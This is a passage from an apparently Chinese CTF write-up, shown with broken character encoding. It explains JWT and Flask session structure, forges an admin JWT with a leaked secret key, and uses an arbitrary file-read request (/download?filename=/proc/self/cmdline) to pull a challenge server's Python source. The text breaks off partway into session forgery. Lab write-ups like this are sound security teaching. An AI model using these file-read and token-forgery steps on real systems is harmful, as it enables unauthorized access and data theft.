<h4 id="2-1-1-Header"><a href="#2-1-1-Header" class="headerlink" title="2.1.1 Header"></a>2.1.1 Header</h4><p>Header éƒ¨åˆ†æ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œç”¨äºæè¿° JWT <span class="hexo-wm">ğ¬â€Œâ‘¶â…´ğ˜¦ğ§ï¼ï»¿â€êœ±ğ¢â€â€Œğ­ï½…ï»¿â€</span>çš„å…ƒæ•°æ®ï¼Œå®ƒé€šå¸¸æ˜¯è¿™æ ·çš„ï¼š</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>
  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span>
<span class="token punctuation">}</span></code></pre>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><p><code>alg</code> å±æ€§è¡¨ç¤º <code>Signature</code> çš„åŠ å¯†ç®—æ³•ï¼Œé»˜è®¤æ˜¯ <code>HMAC SHA256</code> ï¼ˆå†™æˆ <code>HS256</code> ï¼‰</p>
</li>
<li><p><code>typ</code> å±æ€§è¡¨ç¤º <code>token</code> çš„ç±»å‹ï¼Œ<code>JWT</code> ç±»å‹ç»Ÿä¸€å†™ä¸º <code>JWT</code></p>
</li>
</ul>
<p>æœ€åï¼Œå°†ä¸Šé¢çš„ JSON å¯¹è±¡ä½¿ç”¨ <code>Base64URL</code> ç®—æ³•ï¼ˆè¯¦è§åæ–‡<span class="hexo-wm">ğ˜€â€‹Â³veğ’.â€‹ğ’”ğ¢â€‹ğ˜µâ„®â€</span>ï¼‰è½¬æˆå­—ç¬¦ä¸²</p>
<h4 id="2-1-2-Payload"><a href="#2-1-2-Payload" class="headerlink" title="2.1.2 Payload"></a>2.1.2 Payload</h4><p>Payload éƒ¨åˆ†ä¹Ÿæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œç”¨æ¥å­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®</p>
<p>ç”±äºè¯¥éƒ¨åˆ†å¯ä»¥é€šè¿‡ <code>Base64URL</code> è¿›è¡Œè§£å¯†å¹¶è¢«è¯»å–ï¼Œ<span class="hexo-wm">ğ˜´â€‹Â³vğğ’.â€‹â€Œsğ˜ªâ€ï½”ğ˜¦â€‹â€Œ</span>æ­¤å¤„ä¸€èˆ¬ä¸å­˜æ”¾å¯†æ–‡</p>
<p>è¿™ä¸ª JSON å¯¹è±¡æœ€åä¹Ÿè¦ä½¿ç”¨ <code>Base64URL</code> ç®—æ³•ï¼ˆè¯¦è§å<span class="hexo-wm">ğ¬â€‹â€ŒğŸ¯ğ˜·ğ˜¦ğ’Â·â€ğ’”ğ˜ªâ€Œï½”eâ€Œâ€</span>æ–‡ï¼‰è½¬æˆå­—ç¬¦ä¸²</p>
<h4 id="2-1-3-Signature"><a href="#2-1-3-Signature" class="headerlink" title="2.1.3 Signature"></a>2.1.3 Signature</h4><p>Signature éƒ¨åˆ†æ˜¯å¯¹å‰ä¸¤éƒ¨åˆ†çš„ç­¾åï¼Œ<span class="hexo-wm">ğ’”â€‹ï»¿ğŸ¯ğ’—ğğ˜¯.â€â€Ñ•â…ˆï»¿ğ˜µğï»¿</span>é˜²æ­¢æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ç¯¡æ”¹</p>
<p>ç­¾åç”± Header é‡Œé¢æŒ‡å®šçš„ç­¾åç®—æ³•ï¼ˆé»˜è®¤æ˜¯ <code>HMAC SHA256</code> ï¼‰å’Œ è®¾ç½®å¥½çš„å¯†é’¥ï¼ˆ <code>secret_key</code> ï¼‰äº§ç”Ÿï¼š</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">HMACSHA256</span><span class="token punctuation">(</span><span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span></code></pre>

<p>æœ€åï¼ŒæŠŠ Headerã€<span class="hexo-wm">ğ’”â€‹â‘¶ğ’—ğğ’âˆ™â€‹â€Œsğ˜ªâ€Œtğâ€‹â€</span>Payloadã€Signature ä¸‰ä¸ªéƒ¨åˆ†æ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ</p>
<p>æ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨ <code>.</code> åˆ†éš”ï¼Œå°±å½¢æˆäº†ä¸€ä¸ªæœ‰æ•ˆçš„ JSON <span class="hexo-wm">Ñ•â€‹â€Â³vğğ§âˆ™â€ğ¬iâ€‹â€ğ­â„®â€‹</span>Web Token</p>
<h4 id="2-1-4-Base64URL"><a href="#2-1-4-Base64URL" class="headerlink" title="2.1.4 Base64URL"></a>2.1.4 Base64URL</h4><p>å‰é¢æåˆ°ï¼Œå°† Header <span class="hexo-wm">ğ¬â€â€‹Â³ğ˜·eï½Â·â€ğ¬â…ˆï»¿ğ’•ï½…â€â€‹</span>å’Œ Payload ä¸²å‹åŒ–çš„ç®—æ³•æ˜¯ <code>Base64URL</code>ï¼Œ</p>
<p>è¯¥ç®—æ³•è·Ÿ <code>Base64</code> ç®—æ³•åŸºæœ¬ç±»ä¼¼ï¼Œä½†æœ‰ä¸€äº›ä¸åŒï¼š</p>
<ul>
<li>çœç•¥é€šè¿‡ <code>Base64</code> ç®—æ³•å¾—åˆ°çš„ <code>=</code> </li>
<li>å°†é€šè¿‡ <code>Base64</code> ç®—æ³•å¾—åˆ°çš„ <code>+</code> æ›¿æ¢æˆ <code>-</code> ï¼Œ<code>/</code> æ›¿æ¢æˆ <code>_</code></li>
</ul>
<p>è¿™æ˜¯å› ä¸º JWT ä½œä¸ºä¸€ä¸ª <code>token</code> ï¼Œæœ‰æ—¶ä¼šè¢«åº”ç”¨äº <span class="hexo-wm">ğ˜´â€3ğ¯ï½…ğ˜¯ï¼ï»¿ï»¿sâ…ˆâ€‹ğ’•ğâ€‹â€‹</span>URL ä¸­ï¼ˆä¾‹å¦‚ <code>/?token=xxx</code>ï¼‰,</p>
<p>é€šè¿‡ <code>Base64</code> ç®—æ³•å¾—åˆ°çš„ä¸‰<span class="hexo-wm">ğ˜€â€‹â‘¶ğ’—ğ˜¦n.â€‹â€‹ğ˜€ğ˜ªâ€ğ­eâ€â€‹</span>ä¸ªå­—ç¬¦ ( <code>+</code> ã€ <code>/</code> ã€ <code>=</code> ) ï¼Œåœ¨ URL é‡Œé¢æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œçœç•¥æˆ–æ›¿æ¢</p>
<h3 id="2-2-JWTçš„ä¼ªé€ "><a href="#2-2-JWTçš„ä¼ªé€ " class="headerlink" title="2.2 JWTçš„ä¼ªé€ "></a>2.2 JWTçš„ä¼ªé€ </h3><p>ä½¿ç”¨ <a href="https://jwt.io/">jwt.io</a> è§£æ</p>
<p><img src="image-40.png" alt="image-40.png"></p>
<p>åˆ†æä»£ç åå¯ä»¥å‘ç° <span class="hexo-wm">ğ˜´â€‹ï»¿â‘¶â…´â„¯ğ§ï¼ï»¿â€Œğ˜€ğ˜ªâ€â€ğ˜µâ„®â€</span>Cookies <code>auth</code> çš„ <code>SECRET_KEY</code> ä¸º <code>I_LIKE_Aoyama_Nanami</code></p>
<p>åœ¨ <a href="https://jwt.io/">jwt.io</a> ä¸­ä½¿ç”¨ SEC<span class="hexo-wm">ğ’”â€3ğ˜·â„¯ğ˜¯âˆ™ï»¿ğ’”iâ€â€ğ˜µeï»¿</span>RET_KEY ä¼ªé€  <code>{"username":"admin"}</code> å­—æ®µå¹¶é‡æ–°åŠ å¯†ï¼Œ</p>
<p>å¾—åˆ°ä¼ªé€ åçš„ <code>auth</code> å¦‚ä¸‹ï¼š</p>
<p><img src="image-41.png" alt="image-41.png"></p>
<pre class="language-none"><code class="language-none">auth = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.mJHHgw5KDOeM6Fu5r7KXYUb-chM02YBqsqmTWMAdDR0</code></pre>

<h2 id="3-Payload"><a href="#3-Payload" class="headerlink" title="3. Payload"></a>3. Payload</h2><p>ä¿®æ”¹ <code>auth</code> ä¸ºä¼ªé€ åçš„å€¼å¹¶è®¿é—® <code>/download?filename=yuanshen?qidong!</code>ï¼Œå¾—åˆ° <code>flag</code></p>
<p><img src="image-42.png" alt="image-42.png"></p>
<blockquote>
<p>Spirit{6bb3de28-1cc8-<span class="hexo-wm">Ñ•â€ŒğŸ¯â…´â„¯ğ§Â·â€‹êœ±ğ¢â€ï½”ï½…â€Œâ€‹</span>4af3-babe-43593039f366}</p>
</blockquote>
<h1 id="ä½ çœŸçš„å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—"><a href="#ä½ çœŸçš„å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—" class="headerlink" title="ä½ çœŸçš„å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—"></a>ä½ çœŸçš„å–œæ¬¢é¸£æ¿‘ç™½ç¾½å—</h1><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>ä¸æ˜¯çœŸçš„å–œæ¬¢é¸£æ¿‘ç™½ç¾½(?<span class="hexo-wm">ğ˜€â€‹â€Œâ‘¶vâ„®ğ§ï¼ï»¿â€ğ’”â…ˆâ€ï»¿tğ˜¦â€‹</span>)çš„äººæ‹¿ä¸åˆ°flag</p>
</blockquote>
<p>æ‰“å¼€é¡µé¢åå‘ç°åˆæ˜¯ä¸€ä¸ªå›¾åº“<span class="hexo-wm">Ñ•â€â€ğŸ¯veï½.ï»¿ï»¿ğ˜´ï½‰â€‹ï½”eâ€‹</span>ç®¡ç†ä¸‹è½½ç³»ç»Ÿ (ï¼Ÿ)</p>
<p><img src="image-43.png" alt="image-43.png"></p>
<p>ä½†æ˜¯ç‚¹å‡» <code>Download</code> åè·³è½¬è‡³ <code>/download?filename=1.jpg</code> </p>
<p>å‘ç°å›¾ç‰‡ä¸‹è½½ä¸<span class="hexo-wm">ğ˜€ï»¿ğŸ¯vâ„¯ï½âˆ™â€sâ…ˆâ€‹â€Œï½”eï»¿ï»¿</span>ä¸‹æ¥ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>
<p><img src="image-44.png" alt="image-44.png"></p>
<p>çŒœæµ‹æœåŠ¡ç«¯ä»£ç å¯¹<span class="hexo-wm">ğ˜€â€‹Â³ğ˜·ğnâ€¤â€Œêœ±iï»¿â€‹ğ˜µğâ€â€Œ</span>æ–‡ä»¶è¯»å–æ–¹å¼è¿›è¡Œäº†ä¿®æ”¹</p>
<h2 id="1-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´-1"><a href="#1-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´-1" class="headerlink" title="1. ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"></a>1. ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</h2><p>ä¸ä¸Šä¸€é¢˜ç›¸åŒï¼Œ<code>/download?filename=xxxx</code> å¤„ä»å­˜åœ¨ä»»æ„<span class="hexo-wm">ğ’”â€ŒğŸ¯â…´eğ’â€¢â€Œğ˜´iâ€‹ğ­eâ€Œâ€Œ</span>æ–‡ä»¶è¯»å–æ¼æ´</p>
<p>è®¿é—® <code>/download?filename=/proc/self/cmdline</code> , å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python /app/I_LIKE_Nanami.py</code></pre>

<p>æ ¹æ®æœåŠ¡ç«¯ä»£ç è·¯å¾„è®¿é—® <code>/download?filename=/app/I_LIKE_Nanami.py</code>,</p>
<p>å¾—åˆ°æœåŠ¡ç«¯ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> secrets
<span class="token keyword">import</span> subprocess
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> session
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
random_string <span class="token operator">=</span> <span class="token string">"I_LIKE_"</span><span class="token operator">+</span>secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_Aoyama_Nanami"</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> random_string

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>
    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> response

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'1.jpg'</span><span class="token punctuation">)</span>
    offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'offset'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    length <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'length'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> filename <span class="token operator">==</span> <span class="token string">"xingtie?qidong!"</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span> 
            output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/readflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Error executing /readflag: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/images'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> offset <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>length<span class="token punctuation">)</span>
            <span class="token keyword">return</span> data
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"File not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>
        
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Server Error: %s'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"å¥½åƒæœ‰ä»€ä¹ˆé”™è¯¯å–µ!"</span><span class="token punctuation">,</span> <span class="token number">500</span>
    
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
<p>åˆ†æä»£ç åå‘ç°åªæœ‰æ»¡<span class="hexo-wm">sï»¿ï»¿ğŸ¯ğ¯ğ˜¦ï½â€¢ï»¿â€‹ğ’”ğ¢ï»¿â€‹ğ­ğâ€â€</span>è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶æ‰èƒ½è°ƒç”¨ <code>/readflag</code> subprocess æ¥è¯»å–flagï¼š</p>
<ul>
<li>python <span class="hexo-wm">Ñ•â€‹â€Â³ğ˜·ğ˜¦ï½â€¢â€‹ğ¬ğ¢ï»¿â€‹ğ˜µğ˜¦â€‹â€</span>flask <code>session</code> åŒ…å« <code>{"username":"admin"}</code> å­—æ®µ</li>
<li>filename <span class="hexo-wm">ğ˜´â€‹ğŸ¯â…´ğ˜¦nâ€¢â€‹ğ’”ï½‰â€ï½”ï½…â€Œ</span>çš„ GET ä¼ å‚ä¸º <code>xingtie?qidong!</code></li>
</ul>
<h2 id="2-Python-Flask-Session"><a href="#2-Python-Flask-Session" class="headerlink" title="2. Python Flask Session"></a>2. Python Flask Session</h2><p>ä» F12 å¼€å‘äººå‘˜å·¥å…·ä¸­æ‰¾åˆ°å½“å‰ <span class="hexo-wm">ğ˜€ï»¿â€Œâ‘¶vğnâˆ™â€Œâ€‹ğ¬ğ¢â€ğ’•eâ€Œâ€‹</span>Cookies <code>session</code> çš„å€¼</p>
<p><img src="image-45.png" alt="image-45.png"></p>
<pre class="language-none"><code class="language-none">session = eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZRRgdA.WGZwA7J0tKtifRUgBXyh5DmPmzs</code></pre>

<h3 id="2-1-Session-çš„ç»„æˆ"><a href="#2-1-Session-çš„ç»„æˆ" class="headerlink" title="2.1 Session çš„ç»„æˆ"></a>2.1 Session çš„ç»„æˆ</h3><p>Python Flask Session é€šå¸¸æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸²ï¼Œä¸­é—´ç”¨ä¸¤ä¸ª <code>.</code> åˆ†éš”æˆä¸‰ä¸ªéƒ¨åˆ†ï¼ˆå¦‚æœä½¿ç”¨äº†zlib compressï¼Œåˆ™å¼€å¤´ä¼šå¤šå‡ºä¸€ä¸ª <code>.</code>ï¼Œè¯¥éƒ¨åˆ†å½’å±äºSession Dataå†…ï¼‰ï¼Œä¾æ¬¡ä¸ºï¼š</p>
<ul>
<li>Session Dataï¼ˆ <span class="hexo-wm">ğ˜€â€ŒğŸ¯ğ’—ï½…ğ’âˆ™â€ğ’”ğ˜ªâ€‹â€‹ğ˜µâ„®â€Œ</span>Session æ•°æ® ï¼‰</li>
<li>Timesta<span class="hexo-wm">ğ˜´ï»¿3ğ¯ğğ’ï¼â€â€‹ğ’”â…ˆâ€Œï»¿ğ˜µâ„®ï»¿</span>mpï¼ˆ æ—¶é—´æˆ³ ï¼‰</li>
<li>Cryptographic <span class="hexo-wm">sâ€ğŸ¯vâ„¯ğ§â€¢â€‹â€ğ¬ğ¢â€Œâ€ğ­ğâ€</span>Hashï¼ˆ ç­¾å ï¼‰</li>
</ul>
<p>è¯¥å­—ç¬¦ä¸²åº”å½¢å¦‚ï¼šSession Data.<span class="hexo-wm">ğ˜€â€‹ï»¿â‘¶ğ¯ğnï¼ï»¿â€‹ğ¬â…ˆâ€Œâ€Œtğâ€Œâ€‹</span>Timestamp.Cryptographic Hash</p>
<p>ä¸‹é¢å°†åˆ†åˆ«è§£é‡Šä¸‰ä¸ªéƒ¨åˆ†<span class="hexo-wm">Ñ•ï»¿â€Â³ğ˜·ğ˜¦ğ˜¯.â€‹â€Œğ˜´ğ¢â€ï»¿ğ’•ğ˜¦ï»¿â€Œ</span>çš„å†…å®¹åŠå…¶ä½œç”¨ï¼š</p>
<h4 id="2-1-1-Session-Data"><a href="#2-1-1-Session-Data" class="headerlink" title="2.1.1 Session Data"></a>2.1.1 Session Data</h4><p>Session Data éƒ¨åˆ†æ˜¯ä¸€ä¸ª <span class="hexo-wm">ğ˜€ï»¿â€Â³veğ§.ï»¿â€Œğ˜€ğ¢â€‹ğ’•ğ˜¦â€‹â€Œ</span>JSON å¯¹è±¡ï¼Œç”¨æ¥å­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®</p>
<p>Session åœ¨ç”Ÿæˆæ—¶ä¼šæ ¹æ®ä½¿ç”¨ zlib <span class="hexo-wm">ğ’”â€â€‹ğŸ¯ğ’—â„®n.â€‹â€Œğ˜´â…ˆâ€‹ï½”â„®ï»¿â€Œ</span>compress èƒ½å¦å‡å°‘ Session Data éƒ¨åˆ†çš„é•¿åº¦</p>
<p>æ¥é€‰æ‹©æ€§åœ°ä½¿ç”¨ zlib compress <span class="hexo-wm">ğ¬â€3â…´ğ˜¦nÂ·â€ğ˜´iâ€ï»¿tğ˜¦â€‹ï»¿</span>( ä½¿ç”¨çš„æ ‡å¿—æ˜¯Session Data ä»¥ <code>.</code> å¼€å¤´ )</p>
<p>ç”±äºè¯¥éƒ¨åˆ†å¯ä»¥é€šè¿‡ <code>Base64URL</code> è¿›è¡Œè§£å¯†å¹¶è¢«è¯»å–ï¼Œ<span class="hexo-wm">ğ¬â€Œâ€Â³ğ¯eğ˜¯ï¼â€Œâ€Ñ•iâ€Œâ€Œtğâ€‹â€‹</span>æ­¤å¤„ä¸€èˆ¬ä¸å­˜æ”¾å¯†æ–‡</p>
<p>è¿™ä¸ª JSON <span class="hexo-wm">ğ¬â€Œâ€ğŸ¯â…´ğnâˆ™â€‹â€Œğ¬ğ¢â€‹ï»¿ğ˜µğ˜¦â€Œâ€Œ</span>å¯¹è±¡æœ€åä¹Ÿè¦ä½¿ç”¨ <code>Base64URL</code> ç®—æ³•ï¼ˆè¯¦è§åæ–‡ï¼‰è½¬æˆå­—ç¬¦ä¸²</p>
<h4 id="2-1-2-Timestamp"><a href="#2-1-2-Timestamp" class="headerlink" title="2.1.2 Timestamp"></a>2.1.2 Timestamp</h4><p>Timestamp éƒ¨åˆ†é€šå¸¸ç”± Session <span class="hexo-wm">sâ€â€‹3ğ¯ğnÂ·â€â€‹ğ¬ğ˜ªâ€Œteï»¿â€‹</span>ç”Ÿæˆæ—¶é—´çš„æ—¶é—´æˆ³æ„æˆ</p>
<p>è¯¥æ—¶é—´æˆ³æœ€åä¼šè¢«è½¬åŒ–ä¸ºå­—èŠ‚å½¢å¼å¹¶ä½¿ç”¨ <code>Base64URL</code> ç®—æ³•ï¼ˆè¯¦è§å<span class="hexo-wm">ğ˜´â€Œï»¿Â³ğ˜·ğ˜¦ğ’ï¼ï»¿â€‹ğ˜€ï½‰ï»¿tğ˜¦â€Œ</span>æ–‡ï¼‰è¿›è¡ŒåŠ å¯†</p>
<h4 id="2-1-3-Cryptograhpic-Hash"><a href="#2-1-3-Cryptograhpic-Hash" class="headerlink" title="2.1.3 Cryptograhpic Hash"></a>2.1.3 Cryptograhpic Hash</h4><p><code>Python Flask Session</code> åœ¨ç”Ÿæˆ <code>Session</code> çš„æ ¡éªŒç­¾åæ—¶</p>
<p>ä¼šå…ˆå¯¹ <code>secret_key</code> è¿›è¡Œæ“ä½œ</p>
<p>é¦–å…ˆå¯¹ <code>secret_key</code> è¿›è¡Œä¸€æ¬¡ <code>sha1</code> åŠ å¯†</p>
<p>å¹¶ç”¨ <code>"cookie-session"</code>  salt æ¥ <span class="hexo-wm">sâ€3vğğ’âˆ™ï»¿êœ±â…ˆï»¿â€Œteï»¿</span>update åŠ å¯†åçš„ <code>secert_key</code></p>
<p>æ¥ç€å°† <code>Session Data + sep + Timestamp</code> ä½¿ç”¨å¤„ç†å®Œæˆçš„ <code>secret_key</code> è¿›è¡Œä¸€æ¬¡ <code>sha1</code> åŠ å¯†</p>
<p>æœ€åå°†å¾—åˆ°çš„æ•°æ®ä½¿ç”¨ <code>Base64URL</code> ç®—æ³•ï¼ˆè¯¦è§åæ–‡ï¼‰è¿›è¡ŒåŠ å¯†</p>
<h4 id="2-1-4-Base64URL-1"><a href="#2-1-4-Base64URL-1" class="headerlink" title="2.1.4 Base64URL"></a>2.1.4 Base64URL</h4><p>å‰é¢æåˆ°ï¼Œå°† Session <span class="hexo-wm">êœ±ï»¿â€3ğ¯enÂ·â€Œâ€Œsğ¢ï»¿ğ˜µï½…â€</span>Dataã€Timestamp å’Œ Cryptograhpic Hash ä¸²å‹åŒ–çš„ç®—æ³•æ˜¯ <code>Base64URL</code>ï¼Œ</p>
<p>è¯¥ç®—æ³•è·Ÿ <code>Base64</code> ç®—æ³•åŸºæœ¬ç±»ä¼¼ï¼Œ<span class="hexo-wm">sï»¿â€‹â‘¶veğ’.â€Œğ’”ï½‰ï»¿ï½”eâ€Œâ€</span>ä½†æœ‰ä¸€äº›ä¸åŒï¼š</p>
<ul>
<li>çœç•¥é€šè¿‡ <code>Base64</code> ç®—æ³•å¾—åˆ°çš„ <code>=</code> </li>
<li>å°†é€šè¿‡ <code>Base64</code> ç®—æ³•å¾—åˆ°çš„ <code>+</code> æ›¿æ¢æˆ <code>-</code> ï¼Œ<code>/</code> æ›¿æ¢æˆ <code>_</code></li>
</ul>
<p>è¿™æ˜¯å› ä¸º Sessi<span class="hexo-wm">sâ€â€‹â‘¶venâˆ™â€â€‹ğ’”ğ˜ªâ€‹ğ˜µeï»¿â€‹</span>on ä½œä¸ºä¸€ä¸ª <code>token</code> ï¼Œæœ‰æ—¶ä¼šè¢«åº”ç”¨äº URL ä¸­ï¼ˆä¾‹å¦‚ <code>/?token=xxx</code>ï¼‰,</p>
<p>é€šè¿‡ <code>Base64</code> ç®—æ³•å¾—åˆ°çš„ä¸‰<span class="hexo-wm">ğ˜€â€‹â€Â³ğ¯ğnï¼â€Œâ€‹êœ±ï½‰â€ğ­ğâ€</span>ä¸ªå­—ç¬¦ ( <code>+</code> ã€ <code>/</code> ã€ <code>=</code> ) ï¼Œåœ¨ URL é‡Œé¢æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œçœç•¥æˆ–æ›¿æ¢</p>
<h3 id="2-2-Session-çš„ä¼ªé€ "><a href="#2-2-Session-çš„ä¼ªé€ " class="headerlink" title="2.2 Session çš„ä¼ªé€ "></a>2.2 Session çš„ä¼ªé€ </h3><p>ç”±äºæœåŠ¡ç«¯ä»£ç ä½¿<span class="hexo-wm">êœ±â€‹ï»¿3vğğ§â€¤â€êœ±ğ¢ï»¿ï½”â„®â€</span>ç”¨äº†åŒ…å«éšæœºå­—ç¬¦çš„ <code>random_string</code> ä½œä¸º <code>SECRET_KEY</code>,</p>
<p>è€Œ Session çš„ <code>Cryptographic Hash</code> éœ€è¦ä½¿ç”¨ SECRE<span class="hexo-wm">sâ€3ğ˜·ğ˜¦ğ˜¯â€¤â€‹ğ’”ğ¢ï»¿â€ï½”ğ˜¦ï»¿</span>T_KEY ä½œä¸ºå¯†é’¥ï¼Œ</p>
<p>å› æ­¤åœ¨ä¼ªé€  Session å‰æˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è·å– <code>SECRET_KEY</code></p>
